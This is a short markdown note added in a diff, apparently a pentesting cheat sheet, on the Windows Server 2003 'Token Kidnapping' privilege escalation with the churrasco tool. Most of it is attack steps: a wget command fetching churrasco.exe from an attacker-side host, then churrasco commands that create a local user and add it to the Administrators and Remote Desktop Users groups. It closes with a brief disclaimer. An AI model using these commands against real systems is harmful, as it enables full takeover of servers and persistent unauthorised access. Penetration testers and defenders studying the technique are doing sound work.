@@ -1,0 +1,28 @@
+Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation
+
+An oldie but goldie.
+
+Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows 
+services accounts can impersonate.  Other process (not services) that can impersonate are IIS 6 worker processes 
+so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide 
+shared hosting services then I would recomend to not allow users to run this kind of code from ASP.
+Source: https://www.exploit-db.com/exploits/6705
+
+It is worth noting that churrasco needs to be transferred onto the compromised machine first. 
+Example:
+wget http://10.10.10.100/churrasco.exe -o churrasco.exe
+
+Once on the system, execute it:
+c:\Inetpub> churrasco
+ 
+The output should be something like this:
+ /churrasco/-->Usage: Churrasco.exe [-d] "command to run"
+
+Here are some examples on what you can do with churrasco:
+ c:\Inetpub>churrasco -d "net user /add <username> <password>"
+ c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
+ c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
+ 
+ Play nice and do not use this for illegal purposes.
+ 
+ @s1nfulz
